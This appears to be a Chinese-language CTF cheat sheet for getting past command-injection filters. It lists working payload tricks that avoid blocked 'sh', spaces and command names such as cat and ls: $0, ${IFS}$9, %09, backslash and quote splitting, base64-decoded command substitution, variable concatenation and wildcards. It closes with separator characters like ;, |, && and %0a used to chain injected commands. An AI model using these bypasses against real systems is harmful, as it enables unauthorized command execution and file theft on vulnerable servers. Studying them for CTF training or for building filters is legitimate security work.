# 禁用'sh'

```Bash
$0    //等效于'sh','bin/sh'
```

# 禁用空格' '

```Bash
<
${IFS}
$IFS$9
%09
```

$IFS在Linux下表示分隔符，只有cat$IFSflag.text 的时候, bash 解释器会把整个 IFSflag当做变量名，所以导致没有办法运行，然而如果加一个 {} 就固定了变量名，同理在后面加个 $ 可以起到截断的作用，而 $9 指的是当前系统shell 进程的第九个参数的持有者，就是一个空字符串，因此 $9 相当于没有加东西，等于做了一个前后隔离。

# 禁用cat，flag（test），ls命令

## 相似指令

```Bash
cat:由第一行开始显示内容，并将所有内容输出
tac:从最后一行倒序显示内容，并将所有内容输出
more:根据窗口大小，一页一页的现实文件内容
less:和more类似，但其优点可以往前翻页，而且进行可以搜索字符
head:只显示头几行
tail:只显示最后几行
nl:类似于cat -n，显示时输出行号
tailf:类似于tail -f
grep：在文件或输入流中查找匹配制定模式的行    //格式：grep [选项] "模式" 文件/目录
sort%20/flag 读文件
```

## 反斜杠绕过

```Bash
ca\t fl\ag.txt
类似，ls禁用时可以用l\s绕过
```

## 解码绕过

```Bash
`echo 'Y2F0Cg==' | base64 -d`  flag.txt
```

## 编码拼接绕过

```Bash
a=c;b=at;c=f;d=lag;e=.txt;$a$b ${c}${d}${e}
```

## 单双引号绕过

```Bash
c'a't  test
c"a"t  test
```

## 通配符绕过

```Bash
cat  t?st
cat  te*
cat  t[a-z]st
cat  t{a,b,c,d,e,f}st
```

![](https://hnusec-star.feishu.cn/space/api/box/stream/download/asynccode/?code=NjRiNGU3MmQwZGI1N2M3MzQ4NWRjNGFjNzI5M2RiMTRfQmQwR1E4Z0lablBONWtCcDc1NUg5UnBQbE9ncHBDTkhfVG9rZW46S3NyamI1R1ZsbzNDQTZ4QVAwamNDUHJXbmNmXzE3NTMzNDYyNTE6MTc1MzM0OTg1MV9WNA)

[…]表示匹配方括号之中的任意一个字符

{…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。

{…}与[…]有一个重要的区别：当匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开。

## ./*

```Bash
cat ./*    //查看当前目录下所有文件的内容（当然，只能查看文本文档，文件夹是看不了的）
```

# 截断符号代替

当命令执行时，通常会从前端获取数据执行系统预设定的命令，为了加上我们想要执行的其他命令，通常会使用截断符号让系统去执行其他命令。

```Bash
常见的截断符号：
$
;
|
-
(
)
`
||
&&
&
}
{
%0a
```